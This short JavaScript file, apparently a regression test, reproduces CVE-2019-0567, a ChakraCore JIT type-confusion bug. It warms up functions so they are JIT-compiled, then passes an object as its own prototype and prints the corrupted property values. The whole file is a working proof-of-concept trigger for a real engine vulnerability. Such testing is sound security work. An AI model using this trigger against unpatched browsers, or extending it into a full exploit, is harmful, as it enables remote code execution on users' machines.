// chakra: CVE-2019-0567 (InitProto makes an object a prototype in the JIT, lokihardt / saelo) jit-shape
function opt(o, proto, value) { o.b = 1; var tmp = { __proto__: proto }; o.a = value; return o.a; }
for (var i = 0; i < 300; i++) { var o = { a: 1, b: 2 }; opt(o, {}, {}); }
var o = { a: 1, b: 2 };
print(opt(o, o, 0x1234), o.a, o.b, Object.keys(o).join());
var p = { a: 1, b: 2 };
opt(p, p, 1.5);
print(p.a, Object.getPrototypeOf({ __proto__: p }) === p);
function opt2(o, proto) { var x = o.a; Object.create(proto); return o.a + x; }
for (var j = 0; j < 300; j++) opt2({ a: 1 }, {});
var q = { a: 2 };
print(opt2(q, q));
